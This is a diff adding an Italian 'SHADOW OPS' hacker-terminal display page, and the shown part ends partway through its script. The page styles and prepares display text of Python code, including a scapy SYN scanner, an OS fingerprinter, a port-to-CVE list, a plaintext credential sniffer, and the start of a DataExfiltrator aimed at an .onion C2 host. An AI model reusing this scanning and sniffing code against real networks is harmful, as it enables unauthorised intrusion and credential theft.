@@ -1,0 +1,1403 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHADOW OPS — Secure Terminal</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,600;0,700;1,400&family=Inter:wght@300;400;500;600&display=swap');
+
+:root {
+  --bg:       #0a0c0f;
+  --surface1: #0d1117;
+  --surface2: #161b22;
+  --surface3: #21262d;
+  --border:   #30363d;
+  --border2:  #21262d;
+  --text:     #e6edf3;
+  --text2:    #8b949e;
+  --text3:    #484f58;
+  --green:    #3fb950;
+  --green2:   #238636;
+  --green-dim:#1a3d2b;
+  --blue:     #58a6ff;
+  --purple:   #bc8cff;
+  --orange:   #e3b341;
+  --red:      #f85149;
+  --cyan:     #39d3f5;
+  --accent:   #1f6feb;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Inter', sans-serif;
+  height: 100vh;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+
+/* TOPBAR */
+#topbar {
+  height: 48px;
+  background: var(--surface1);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  gap: 12px;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 100;
+}
+.tb-logo {
+  display: flex; align-items: center; gap: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; font-weight: 700;
+  color: var(--text);
+  letter-spacing: .5px;
+}
+.tb-logo-dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 6px var(--green);
+  animation: pulse 2s ease-in-out infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+.tb-tabs {
+  display: flex; gap: 2px; margin-left: 8px;
+}
+.tb-tab {
+  padding: 5px 14px;
+  border-radius: 6px;
+  font-size: 12px;
+  color: var(--text2);
+  cursor: default;
+  transition: all .15s;
+}
+.tb-tab.active {
+  background: var(--surface3);
+  color: var(--text);
+}
+.tb-right {
+  margin-left: auto;
+  display: flex; align-items: center; gap: 16px;
+  font-size: 11px; color: var(--text3);
+  font-family: 'JetBrains Mono', monospace;
+}
+.tb-badge {
+  padding: 2px 8px; border-radius: 20px;
+  font-size: 10px; font-weight: 600;
+  letter-spacing: .5px;
+}
+.badge-green { background: var(--green-dim); color: var(--green); }
+.badge-blue  { background: rgba(88,166,255,.12); color: var(--blue); }
+.badge-red   { background: rgba(248,81,73,.12); color: var(--red); }
+.tb-time { color: var(--text2); }
+
+/* MAIN LAYOUT */
+#main {
+  flex: 1;
+  display: grid;
+  grid-template-columns: 260px 1fr 280px;
+  gap: 0;
+  overflow: hidden;
+  border-right: 1px solid var(--border);
+}
+
+/* SIDEBAR SINISTRA */
+#sidebar-left {
+  background: var(--surface1);
+  border-right: 1px solid var(--border);
+  display: flex; flex-direction: column;
+  overflow: hidden;
+}
+.sl-section { border-bottom: 1px solid var(--border2); }
+.sl-header {
+  padding: 10px 16px 8px;
+  font-size: 10px; font-weight: 600;
+  color: var(--text3);
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+.sl-item {
+  display: flex; align-items: center; gap: 8px;
+  padding: 6px 16px;
+  font-size: 12px;
+  color: var(--text2);
+  cursor: default;
+  transition: background .1s;
+  position: relative;
+}
+.sl-item:hover { background: var(--surface2); }
+.sl-item.active { background: rgba(31,111,235,.15); color: var(--blue); }
+.sl-item.active::before {
+  content:''; position:absolute; left:0; top:0; bottom:0; width:2px;
+  background: var(--blue);
+}
+.sl-dot {
+  width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0;
+}
+.dot-green { background: var(--green); box-shadow: 0 0 4px var(--green); }
+.dot-orange{ background: var(--orange); box-shadow: 0 0 4px var(--orange); }
+.dot-red   { background: var(--red); box-shadow: 0 0 4px var(--red); }
+.dot-blue  { background: var(--blue); box-shadow: 0 0 4px var(--blue); }
+.dot-gray  { background: var(--text3); }
+
+.sl-item-right { margin-left: auto; font-size: 10px; color: var(--text3);
+  font-family: 'JetBrains Mono', monospace; }
+
+/* Mini sparkline */
+.mini-chart {
+  height: 28px; padding: 8px 16px 6px;
+  display: flex; align-items: flex-end; gap: 2px;
+}
+.mc-bar {
+  flex: 1; background: var(--green-dim); border-radius: 2px;
+  min-height: 2px; transition: height .5s;
+}
+.mc-bar.hi { background: rgba(88,166,255,.3); }
+
+/* Metric cards */
+.metric-card {
+  margin: 8px 12px; padding: 10px 12px;
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+}
+.mc-label { font-size: 10px; color: var(--text3); margin-bottom: 4px; font-weight:500; letter-spacing:.5px; }
+.mc-value { font-family: 'JetBrains Mono', monospace; font-size: 20px; font-weight:700; }
+.mc-value.green { color: var(--green); }
+.mc-value.blue  { color: var(--blue); }
+.mc-value.orange{ color: var(--orange); }
+.mc-sub { font-size: 10px; color: var(--text3); margin-top: 2px; }
+
+.progress-mini { height: 3px; background: var(--surface3); border-radius: 2px; margin-top:6px; overflow:hidden; }
+.progress-fill { height: 100%; border-radius: 2px; transition: width .4s; }
+.pf-green { background: var(--green); }
+.pf-blue  { background: var(--blue); }
+.pf-orange{ background: var(--orange); }
+
+/* TERMINALE CENTRALE */
+#terminal-area {
+  display: flex; flex-direction: column;
+  background: var(--bg);
+  overflow: hidden;
+  position: relative;
+}
+#term-tabs {
+  display: flex; align-items: center;
+  background: var(--surface1);
+  border-bottom: 1px solid var(--border);
+  padding: 0 16px;
+  height: 36px;
+  gap: 4px;
+  flex-shrink: 0;
+}
+.term-tab {
+  display: flex; align-items: center; gap: 6px;
+  padding: 4px 12px;
+  font-size: 11px;
+  color: var(--text2);
+  border-radius: 6px 6px 0 0;
+  cursor: default;
+  font-family: 'JetBrains Mono', monospace;
+}
+.term-tab.active {
+  background: var(--bg);
+  color: var(--text);
+  border: 1px solid var(--border);
+  border-bottom: 1px solid var(--bg);
+  margin-bottom: -1px;
+}
+.term-tab-dot { width:5px;height:5px;border-radius:50%; }
+
+/* Breadcrumb path */
+#term-path {
+  padding: 6px 20px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text3);
+  background: var(--surface1);
+  border-bottom: 1px solid var(--border2);
+  display: flex; align-items:center; gap:6px;
+  flex-shrink: 0;
+}
+.path-sep { color: var(--border); }
+.path-part { color: var(--blue); }
+.path-part:last-child { color: var(--text2); }
+
+#output {
+  flex: 1;
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding: 16px 20px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  line-height: 1.7;
+  word-break: break-word;
+  scrollbar-width: thin;
+  scrollbar-color: var(--surface3) transparent;
+}
+#output::-webkit-scrollbar { width: 6px; }
+#output::-webkit-scrollbar-thumb { background: var(--surface3); border-radius:3px; }
+
+/* Syntax highlighting via classi */
+.c-comment  { color: #6e7681; font-style:italic; }
+.c-keyword  { color: var(--purple); font-weight:600; }
+.c-string   { color: var(--orange); }
+.c-number   { color: var(--cyan); }
+.c-func     { color: var(--blue); }
+.c-class    { color: #ffa657; }
+.c-ok       { color: var(--green); font-weight:600; }
+.c-warn     { color: var(--orange); }
+.c-err      { color: var(--red); font-weight:600; }
+.c-dim      { color: var(--text3); }
+.c-prompt   { color: var(--green); }
+.c-path     { color: var(--blue); }
+
+#prompt-row {
+  padding: 8px 20px 12px;
+  display: flex; align-items: center; gap: 8px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  flex-shrink: 0;
+  border-top: 1px solid var(--border2);
+}
+.pr-user { color: var(--green); font-weight:600; }
+.pr-at   { color: var(--text3); }
+.pr-host { color: var(--blue); }
+.pr-path { color: var(--purple); }
+.pr-dollar{ color: var(--text2); }
+#cursor-block {
+  display: inline-block; width: 8px; height: 16px;
+  background: var(--green);
+  animation: cb .8s step-end infinite;
+  border-radius: 1px;
+  vertical-align: middle;
+  box-shadow: 0 0 4px var(--green);
+}
+@keyframes cb { 0%,100%{opacity:1}50%{opacity:0} }
+
+/* SIDEBAR DESTRA */
+#sidebar-right {
+  background: var(--surface1);
+  border-left: 1px solid var(--border);
+  display: flex; flex-direction: column;
+  overflow: hidden;
+  font-size: 12px;
+}
+
+.sr-section {
+  border-bottom: 1px solid var(--border2);
+  padding: 12px 16px;
+}
+.sr-title {
+  font-size: 10px; font-weight:600; color: var(--text3);
+  letter-spacing: 1px; text-transform:uppercase; margin-bottom:10px;
+}
+
+/* Network activity */
+.net-item {
+  display: flex; align-items:center; justify-content:space-between;
+  padding: 5px 0;
+  border-bottom: 1px solid var(--border2);
+}
+.net-item:last-child { border-bottom:none; }
+.net-ip { font-family:'JetBrains Mono',monospace; font-size:11px; color: var(--text2); }
+.net-port { font-family:'JetBrains Mono',monospace; font-size:10px; color: var(--text3); }
+.net-status { font-size:10px; padding:1px 6px; border-radius:4px; font-weight:500; }
+.ns-open   { background:rgba(63,185,80,.15); color:var(--green); }
+.ns-filter { background:rgba(227,179,65,.12); color:var(--orange); }
+.ns-closed { background:var(--surface3); color:var(--text3); }
+
+/* Log stream */
+#log-stream {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  line-height: 1.8;
+  color: var(--text3);
+  overflow: hidden;
+  max-height: 160px;
+}
+.log-info  { color: var(--blue); }
+.log-ok    { color: var(--green); }
+.log-warn  { color: var(--orange); }
+.log-err   { color: var(--red); }
+
+/* Graph area */
+.graph-wrap {
+  height: 60px;
+  display: flex; align-items:flex-end; gap:2px;
+  margin-top: 8px;
+}
+.g-col { flex:1; display:flex; flex-direction:column-reverse; gap:1px; }
+.g-seg { border-radius:1px; transition: height .3s; }
+
+/* STATUS BAR */
+#statusbar {
+  height: 24px;
+  background: var(--surface1);
+  border-top: 1px solid var(--border);
+  display: flex; align-items:center; gap:0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  flex-shrink: 0;
+}
+.sb-item {
+  padding: 0 12px; height:100%;
+  display:flex;align-items:center;gap:5px;
+  border-right: 1px solid var(--border2);
+  color: var(--text3);
+  white-space: nowrap;
+}
+.sb-item.active { background: rgba(31,111,235,.2); color: var(--blue); }
+.sb-item.ok { color: var(--green); }
+.sb-item.warn { color: var(--orange); }
+.sb-right { margin-left:auto; display:flex; }
+.sb-dot { width:5px;height:5px;border-radius:50%; }
+
+/* === OVERLAY NOTIFICHE === */
+#notif {
+  position: fixed;
+  top: 60px; right: 16px;
+  display: flex; flex-direction:column; gap:8px;
+  z-index: 9000;
+  pointer-events: none;
+}
+.notif-card {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px 16px;
+  min-width: 280px;
+  max-width: 340px;
+  box-shadow: 0 8px 24px rgba(0,0,0,.5);
+  animation: notif-in .2s ease;
+  font-size: 12px;
+}
+@keyframes notif-in {
+  0%{transform:translateX(20px);opacity:0} 100%{transform:translateX(0);opacity:1}
+}
+.notif-card.fade-out { animation: notif-out .3s ease forwards; }
+@keyframes notif-out {
+  100%{transform:translateX(20px);opacity:0}
+}
+.notif-head {
+  display:flex;align-items:center;gap:8px;margin-bottom:6px;
+}
+.notif-icon { font-size:14px; }
+.notif-title { font-weight:600; font-size:12px; }
+.notif-body { color: var(--text2); font-size:11px; line-height:1.5; font-family:'JetBrains Mono',monospace; }
+.notif-card.green { border-left: 3px solid var(--green); }
+.notif-card.blue  { border-left: 3px solid var(--blue); }
+.notif-card.orange{ border-left: 3px solid var(--orange); }
+.notif-card.red   { border-left: 3px solid var(--red); border-color: var(--red); }
+
+/* === MODAL OVERLAY === */
+#modal-bg {
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.7);
+  display:none;align-items:center;justify-content:center;
+  z-index:8000;
+  backdrop-filter: blur(4px);
+}
+#modal-bg.show { display:flex; }
+#modal {
+  background: var(--surface1);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  width: 480px;
+  box-shadow: 0 24px 64px rgba(0,0,0,.8);
+  overflow: hidden;
+  animation: modal-in .2s ease;
+}
+@keyframes modal-in {
+  0%{transform:scale(.94);opacity:0} 100%{transform:scale(1);opacity:1}
+}
+#modal-title-bar {
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border);
+  display:flex;align-items:center;gap:10px;
+  font-weight:600; font-size:13px;
+}
+#modal-body { padding: 20px; }
+.modal-row { display:flex;justify-content:space-between;align-items:center;
+  padding:8px 0;border-bottom:1px solid var(--border2);font-size:12px; }
+.modal-row:last-child { border-bottom:none; }
+.modal-key { color: var(--text2); }
+.modal-val { font-family:'JetBrains Mono',monospace;font-size:11px; }
+.modal-val.green  { color:var(--green); }
+.modal-val.orange { color:var(--orange); }
+.modal-val.red    { color:var(--red); }
+
+/* Progress bar modale */
+.modal-progress-wrap { margin-top:16px; }
+.mp-label { font-size:11px;color:var(--text2);margin-bottom:6px;
+  display:flex;justify-content:space-between; }
+.mp-track { height:6px;background:var(--surface3);border-radius:3px;overflow:hidden; }
+.mp-fill { height:100%;border-radius:3px;transition:width .05s;background:var(--blue); }
+
+/* Matrix overlay */
+#matrix-canvas {
+  position:fixed;inset:0;display:none;
+  z-index:7000;pointer-events:none;opacity:.85;
+}
+#matrix-canvas.show { display:block; }
+
+/* Key hints overlay */
+#keyhints {
+  position:fixed;bottom:28px;left:50%;transform:translateX(-50%);
+  display:flex;gap:8px;
+  z-index:6000;pointer-events:none;
+  animation: fade-hints 6s ease forwards;
+}
+@keyframes fade-hints {
+  0%,60%{opacity:1} 100%{opacity:0}
+}
+.kh {
+  background:var(--surface2);
+  border:1px solid var(--border);
+  border-radius:6px;
+  padding:6px 12px;
+  font-size:11px;
+  display:flex;align-items:center;gap:6px;
+}
+.kh kbd {
+  background:var(--surface3);
+  border:1px solid var(--border);
+  border-radius:4px;
+  padding:1px 6px;
+  font-family:'JetBrains Mono',monospace;
+  font-size:10px;
+  color:var(--orange);
+  box-shadow:0 2px 0 var(--border);
+}
+.kh span { color:var(--text2); }
+</style>
+</head>
+<body>
+
+<!-- MATRIX CANVAS -->
+<canvas id="matrix-canvas"></canvas>
+
+<!-- MODAL -->
+<div id="modal-bg">
+  <div id="modal">
+    <div id="modal-title-bar">
+      <span id="modal-icon">🔐</span>
+      <span id="modal-title">Operazione in corso</span>
+    </div>
+    <div id="modal-body"></div>
+  </div>
+</div>
+
+<!-- NOTIFICHE -->
+<div id="notif"></div>
+
+<!-- TOPBAR -->
+<div id="topbar">
+  <div class="tb-logo">
+    <div class="tb-logo-dot"></div>
+    SHADOW<span style="color:var(--text3)">OPS</span>
+  </div>
+  <div class="tb-tabs">
+    <div class="tb-tab active">Terminal</div>
+    <div class="tb-tab">Network</div>
+    <div class="tb-tab">Exploits</div>
+    <div class="tb-tab">Payloads</div>
+  </div>
+  <div class="tb-right">
+    <span class="tb-badge badge-green">● TOR ATTIVO</span>
+    <span class="tb-badge badge-blue">AES-256</span>
+    <span id="tb-ip" class="tb-badge badge-blue"></span>
+    <span id="tb-alert" class="tb-badge" style="display:none"></span>
+    <span class="tb-time" id="tb-clock">00:00:00</span>
+  </div>
+</div>
+
+<!-- MAIN -->
+<div id="main">
+
+  <!-- SIDEBAR SINISTRA -->
+  <div id="sidebar-left">
+    <div class="sl-section">
+      <div class="sl-header">Obiettivi</div>
+      <div id="target-list"></div>
+    </div>
+
+    <div class="sl-section">
+      <div class="sl-header">Risorse</div>
+      <div style="padding:8px 12px 4px">
+        <div class="mc-label">CPU USAGE</div>
+        <div style="display:flex;align-items:baseline;gap:6px">
+          <div class="mc-value green" id="cpu-val">0%</div>
+          <div class="mc-sub">encryption engine</div>
+        </div>
+        <div class="progress-mini"><div class="progress-fill pf-green" id="cpu-bar" style="width:0%"></div></div>
+
+        <div class="mc-label" style="margin-top:10px">MEMORIA</div>
+        <div style="display:flex;align-items:baseline;gap:6px">
+          <div class="mc-value blue" id="ram-val">0%</div>
+          <div class="mc-sub">buffer allocato</div>
+        </div>
+        <div class="progress-mini"><div class="progress-fill pf-blue" id="ram-bar" style="width:0%"></div></div>
+
+        <div class="mc-label" style="margin-top:10px">RETE TX/RX</div>
+        <div style="display:flex;align-items:baseline;gap:6px">
+          <div class="mc-value orange" id="net-val">0 KB/s</div>
+        </div>
+        <div class="progress-mini"><div class="progress-fill pf-orange" id="net-bar" style="width:0%"></div></div>
+      </div>
+      <div class="mini-chart" id="mini-chart"></div>
+    </div>
+
+    <div class="sl-section" style="flex:1;overflow:hidden">
+      <div class="sl-header" style="padding-top:12px">Sessioni attive</div>
+      <div id="sessions-list"></div>
+    </div>
+  </div>
+
+  <!-- TERMINALE -->
+  <div id="terminal-area">
+    <div id="term-tabs">
+      <div class="term-tab active">
+        <div class="term-tab-dot" style="background:var(--green)"></div>
+        bash — root@shadow
+      </div>
+      <div class="term-tab">
+        <div class="term-tab-dot" style="background:var(--blue)"></div>
+        python3
+      </div>
+      <div class="term-tab">
+        <div class="term-tab-dot" style="background:var(--orange)"></div>
+        nmap
+      </div>
+      <div style="margin-left:auto;color:var(--text3);font-size:11px;
+        font-family:'JetBrains Mono',monospace;" id="byte-counter">0 B</div>
+    </div>
+    <div id="term-path">
+      <span class="path-part">~</span>
+      <span class="path-sep">/</span>
+      <span class="path-part">operazioni</span>
+      <span class="path-sep">/</span>
+      <span class="path-part">codice-nero</span>
+      <span style="margin-left:auto;color:var(--text3);font-size:10px">
+        utf-8 · python · ln <span id="line-count">1</span>
+      </span>
+    </div>
+    <div id="output"></div>
+    <div id="prompt-row">
+      <span class="pr-user">root</span><span class="pr-at">@</span><span class="pr-host">shadow</span>
+      <span class="pr-at">:</span><span class="pr-path">~/operazioni/codice-nero</span>
+      <span class="pr-dollar">$</span>
+      <span id="cursor-block"></span>
+    </div>
+  </div>
+
+  <!-- SIDEBAR DESTRA -->
+  <div id="sidebar-right">
+    <div class="sr-section">
+      <div class="sr-title">Porte rilevate</div>
+      <div id="port-list"></div>
+    </div>
+
+    <div class="sr-section">
+      <div class="sr-title">Traffico di rete</div>
+      <div class="graph-wrap" id="traffic-graph"></div>
+    </div>
+
+    <div class="sr-section" style="flex:1;overflow:hidden">
+      <div class="sr-title">Sistema log</div>
+      <div id="log-stream"></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- STATUS BAR -->
+<div id="statusbar">
+  <div class="sb-item ok">
+    <div class="sb-dot" style="background:var(--green)"></div>
+    TOR #7 — amsterdam
+  </div>
+  <div class="sb-item">
+    <div class="sb-dot" style="background:var(--blue)"></div>
+    AES-256-GCM
+  </div>
+  <div class="sb-item warn" id="sb-vuln">0 vulnerabilità</div>
+  <div class="sb-item" id="sb-bytes">0 B scritti</div>
+  <div class="sb-item" id="sb-pkts">0 pacchetti</div>
+  <div class="sb-right">
+    <div class="sb-item"><kbd style="font-family:inherit">F1</kbd> Accesso</div>
+    <div class="sb-item"><kbd style="font-family:inherit">F2</kbd> Matrix</div>
+    <div class="sb-item"><kbd style="font-family:inherit">F3</kbd> Crack</div>
+    <div class="sb-item"><kbd style="font-family:inherit">F4</kbd> Esfiltra</div>
+    <div class="sb-item"><kbd style="font-family:inherit">F5</kbd> Scan</div>
+    <div class="sb-item"><kbd style="font-family:inherit">ESC</kbd> Panic</div>
+  </div>
+</div>
+
+<!-- KEY HINTS INIZIALI -->
+<div id="keyhints">
+  <div class="kh"><kbd>F1</kbd><span>Accesso</span></div>
+  <div class="kh"><kbd>F2</kbd><span>Matrix</span></div>
+  <div class="kh"><kbd>F3</kbd><span>Crack pwd</span></div>
+  <div class="kh"><kbd>F4</kbd><span>Esfiltra</span></div>
+  <div class="kh"><kbd>F5</kbd><span>Port scan</span></div>
+  <div class="kh"><kbd>ESC</kbd><span>Panic</span></div>
+</div>
+
+<script>
+// =============================================
+// CODICE DA MOSTRARE (con syntax highlight inline)
+// =============================================
+const segments = [
+`<span class="c-comment">#!/usr/bin/env python3</span>
+<span class="c-comment"># operazione: codice-nero | classificato SEGRETO</span>
+<span class="c-comment"># kernel: 6.11.0-kali3-amd64 | python: 3.12.0</span>
+`,
+`<span class="c-keyword">import</span> <span class="c-func">socket</span>, <span class="c-func">threading</span>, <span class="c-func">hashlib</span>, <span class="c-func">struct</span>
+<span class="c-keyword">import</span> <span class="c-func">os</span>, <span class="c-func">sys</span>, <span class="c-func">json</span>, <span class="c-func">time</span>, <span class="c-func">re</span>
+<span class="c-keyword">from</span> <span class="c-func">cryptography.hazmat.primitives</span> <span class="c-keyword">import</span> hashes, serialization
+<span class="c-keyword">from</span> <span class="c-func">cryptography.hazmat.primitives.asymmetric</span> <span class="c-keyword">import</span> rsa, padding
+<span class="c-keyword">from</span> <span class="c-func">scapy.all</span> <span class="c-keyword">import</span> *
+<span class="c-keyword">import</span> <span class="c-func">paramiko</span>, <span class="c-func">nmap</span>, <span class="c-func">requests</span>
+`,
+`
+<span class="c-class">TARGET_CONFIG</span> = {
+    <span class="c-string">"primary"</span>:    <span class="c-string">"192.168.100.50"</span>,
+    <span class="c-string">"secondary"</span>:  <span class="c-string">"10.10.14.22"</span>,
+    <span class="c-string">"c2_server"</span>:  <span class="c-string">"7f3a9c.onion"</span>,
+    <span class="c-string">"key_aes"</span>:    hashlib.<span class="c-func">sha256</span>(<span class="c-string">b"CODICE_NERO_2025"</span>).<span class="c-func">digest</span>(),
+    <span class="c-string">"tor_exit"</span>:   <span class="c-string">"amsterdam_node_7"</span>,
+    <span class="c-string">"port_range"</span>: <span class="c-func">range</span>(<span class="c-number">1</span>, <span class="c-number">65536</span>),
+}
+`,
+`
+<span class="c-keyword">class</span> <span class="c-class">NetworkScanner</span>:
+    <span class="c-comment">"""Scanner stealth con SYN packets e OS fingerprinting."""</span>
+    
+    <span class="c-keyword">def</span> <span class="c-func">__init__</span>(<span class="c-keyword">self</span>, target: <span class="c-func">str</span>, timeout: <span class="c-func">float</span> = <span class="c-number">0.5</span>):
+        <span class="c-keyword">self</span>.target       = target
+        <span class="c-keyword">self</span>.timeout      = timeout
+        <span class="c-keyword">self</span>.open_ports   = []
+        <span class="c-keyword">self</span>.services     = {}
+        <span class="c-keyword">self</span>.vulnerabilities = []
+        <span class="c-keyword">self</span>.nm = nmap.<span class="c-class">PortScanner</span>()
+    
+    <span class="c-keyword">def</span> <span class="c-func">syn_scan</span>(<span class="c-keyword">self</span>, ports: list) -> list:
+        <span class="c-func">print</span>(<span class="c-string">f"[*] SYN scan avviato su </span>{<span class="c-keyword">self</span>.target}<span class="c-string">..."</span>)
+        <span class="c-keyword">for</span> port <span class="c-keyword">in</span> ports:
+            pkt = <span class="c-class">IP</span>(dst=<span class="c-keyword">self</span>.target)/<span class="c-class">TCP</span>(dport=port, flags=<span class="c-string">"S"</span>)
+            resp = <span class="c-func">sr1</span>(pkt, timeout=<span class="c-keyword">self</span>.timeout, verbose=<span class="c-number">0</span>)
+            <span class="c-keyword">if</span> resp <span class="c-keyword">and</span> resp.haslayer(<span class="c-class">TCP</span>):
+                <span class="c-keyword">if</span> resp[<span class="c-class">TCP</span>].flags == <span class="c-number">0x12</span>:
+                    <span class="c-keyword">self</span>.open_ports.<span class="c-func">append</span>(port)
+                    banner = <span class="c-keyword">self</span>.<span class="c-func">_grab_banner</span>(port)
+                    <span class="c-keyword">self</span>.services[port] = banner
+                    <span class="c-func">print</span>(<span class="c-string">f"[+] {port}/tcp OPEN  {banner}"</span>)
+                    <span class="c-comment"># RST per non completare il 3-way handshake</span>
+                    rst = <span class="c-class">IP</span>(dst=<span class="c-keyword">self</span>.target)/<span class="c-class">TCP</span>(dport=port, flags=<span class="c-string">"R"</span>)
+                    <span class="c-func">send</span>(rst, verbose=<span class="c-number">0</span>)
+        <span class="c-keyword">return</span> <span class="c-keyword">self</span>.open_ports
+`,
+`
+    <span class="c-keyword">def</span> <span class="c-func">os_fingerprint</span>(<span class="c-keyword">self</span>) -> <span class="c-func">dict</span>:
+        <span class="c-func">print</span>(<span class="c-string">"[*] OS fingerprinting..."</span>)
+        result = <span class="c-keyword">self</span>.nm.<span class="c-func">scan</span>(<span class="c-keyword">self</span>.target, arguments=<span class="c-string">"-O --osscan-guess -T4"</span>)
+        <span class="c-keyword">try</span>:
+            matches = result[<span class="c-string">'scan'</span>][<span class="c-keyword">self</span>.target][<span class="c-string">'osmatch'</span>]
+            <span class="c-keyword">for</span> m <span class="c-keyword">in</span> matches[:<span class="c-number">3</span>]:
+                <span class="c-func">print</span>(<span class="c-string">f"[+] {m['name']} — accuratezza: {m['accuracy']}%"</span>)
+            <span class="c-keyword">return</span> matches
+        <span class="c-keyword">except</span> <span class="c-class">KeyError</span>:
+            <span class="c-func">print</span>(<span class="c-string">"[!] Fingerprinting non conclusivo — target potrebbe filtrare ICMP"</span>)
+            <span class="c-keyword">return</span> {}
+
+    <span class="c-keyword">def</span> <span class="c-func">check_vulnerabilities</span>(<span class="c-keyword">self</span>) -> list:
+        <span class="c-class">CVE_DB</span> = {
+            <span class="c-number">22</span>:   [<span class="c-string">"CVE-2023-38408"</span>, <span class="c-string">"CVE-2021-41617"</span>],
+            <span class="c-number">80</span>:   [<span class="c-string">"CVE-2023-25690"</span>, <span class="c-string">"CVE-2021-42013"</span>],
+            <span class="c-number">445</span>:  [<span class="c-string">"MS17-010 EternalBlue"</span>, <span class="c-string">"CVE-2020-0796 SMBGhost"</span>],
+            <span class="c-number">3389</span>: [<span class="c-string">"CVE-2019-0708 BlueKeep"</span>, <span class="c-string">"CVE-2023-35352"</span>],
+            <span class="c-number">8080</span>: [<span class="c-string">"CVE-2022-33891"</span>, <span class="c-string">"CVE-2021-26084 Confluence"</span>],
+        }
+        <span class="c-keyword">for</span> port <span class="c-keyword">in</span> <span class="c-keyword">self</span>.open_ports:
+            <span class="c-keyword">if</span> port <span class="c-keyword">in</span> <span class="c-class">CVE_DB</span>:
+                <span class="c-keyword">for</span> cve <span class="c-keyword">in</span> <span class="c-class">CVE_DB</span>[port]:
+                    <span class="c-keyword">self</span>.vulnerabilities.<span class="c-func">append</span>((port, cve))
+                    <span class="c-func">print</span>(<span class="c-string">f"[!] VULN TROVATA: {port}/tcp → {cve}"</span>)
+        <span class="c-keyword">return</span> <span class="c-keyword">self</span>.vulnerabilities
+`,
+`
+<span class="c-keyword">class</span> <span class="c-class">CredentialHarvester</span>:
+    <span class="c-comment">"""Intercetta e decifra credenziali dal traffico di rete."""</span>
+    
+    PATTERNS = {
+        <span class="c-string">'password'</span>: <span class="c-func">re.compile</span>(<span class="c-string">r'pass(?:word)?[\\s=:]+([\\S]+)'</span>, re.<span class="c-class">I</span>),
+        <span class="c-string">'username'</span>: <span class="c-func">re.compile</span>(<span class="c-string">r'user(?:name)?[\\s=:]+([\\S]+)'</span>, re.<span class="c-class">I</span>),
+        <span class="c-string">'token'</span>:    <span class="c-func">re.compile</span>(<span class="c-string">r'(?:token|bearer|api_key)[\\s=:]+([\\S]{20,})'</span>, re.<span class="c-class">I</span>),
+        <span class="c-string">'jwt'</span>:      <span class="c-func">re.compile</span>(<span class="c-string">r'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+'</span>),
+        <span class="c-string">'hash_md5'</span>: <span class="c-func">re.compile</span>(<span class="c-string">r'\\b[a-f0-9]{32}\\b'</span>),
+        <span class="c-string">'hash_sha'</span>: <span class="c-func">re.compile</span>(<span class="c-string">r'\\b[a-f0-9]{40,64}\\b'</span>),
+    }
+    
+    <span class="c-keyword">def</span> <span class="c-func">sniff_credentials</span>(<span class="c-keyword">self</span>, iface: <span class="c-func">str</span> = <span class="c-string">"eth0"</span>):
+        <span class="c-func">print</span>(<span class="c-string">f"[*] Sniffing su {iface} — filtro: tcp port 80 or 443 or 21 or 110"</span>)
+        <span class="c-func">sniff</span>(
+            iface=iface,
+            filter=<span class="c-string">"tcp port 80 or tcp port 21 or tcp port 110"</span>,
+            prn=<span class="c-keyword">self</span>.<span class="c-func">_analyze_packet</span>,
+            store=<span class="c-number">0</span>
+        )
+    
+    <span class="c-keyword">def</span> <span class="c-func">_analyze_packet</span>(<span class="c-keyword">self</span>, pkt):
+        <span class="c-keyword">if</span> pkt.haslayer(<span class="c-class">Raw</span>):
+            payload = pkt[<span class="c-class">Raw</span>].load.<span class="c-func">decode</span>(<span class="c-string">'utf-8'</span>, errors=<span class="c-string">'ignore'</span>)
+            <span class="c-keyword">for</span> tipo, pattern <span class="c-keyword">in</span> <span class="c-keyword">self</span>.<span class="c-class">PATTERNS</span>.<span class="c-func">items</span>():
+                m = pattern.<span class="c-func">search</span>(payload)
+                <span class="c-keyword">if</span> m:
+                    <span class="c-func">print</span>(<span class="c-string">f"[!!!] {tipo.upper()} intercettato: {m.group(1)[:40]}"</span>)
+`,
+`
+<span class="c-keyword">class</span> <span class="c-class">DataExfiltrator</span>:
+    <span class="c-comment">"""Esfiltrazione via DNS tunneling, ICMP covert channel, HTTPS steganografia."""</span>
+    
+    <span class="c-keyword">def</span> <span class="c-func">__init__</span>(<span class="c-keyword">self</span>, c2: <span class="c-func">str</span>, key: bytes):
+        <span class="c-keyword">self</span>.c2  = c2
+        <span class="c-keyword">self</span>.key = key
+        <span class="c-keyword">self</span>.stats = {<span class="c-string">'bytes'</span>: <span class="c-number">0</span>, <span class="c-string">'packets'</span>: <span class="c-number">0</span>, <span class="c-string">'errors'</span>: <span class="c-number">0</span>}
+    
+    <span class="c-keyword">def</span> <span class="c-func">_encrypt</span>(<span class="c-keyword">self</span>, data: bytes) -> bytes:
+        <span class="c-keyword">from</span> <span class="c-func">cryptography.hazmat.primitives.ciphers</span> <span class="c-keyword">import</span> Cipher, algorithms, modes
